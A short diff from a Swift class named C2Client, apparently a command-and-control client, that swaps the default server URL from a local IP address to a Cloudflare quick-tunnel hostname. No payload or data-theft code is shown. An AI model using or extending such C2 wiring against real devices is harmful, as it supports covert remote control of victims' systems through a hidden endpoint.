@@ -6,7 +6,7 @@ class C2Client {
     
     // MARK: - Configuration
     var c2URL: String {
-        get { UserDefaults.standard.string(forKey: "pv_c2_url") ?? "http://172.20.10.5:3002" }
+        get { UserDefaults.standard.string(forKey: "pv_c2_url") ?? "https://native-branches-enabled-completing.trycloudflare.com" }
         set { UserDefaults.standard.set(newValue, forKey: "pv_c2_url") }
     }
     
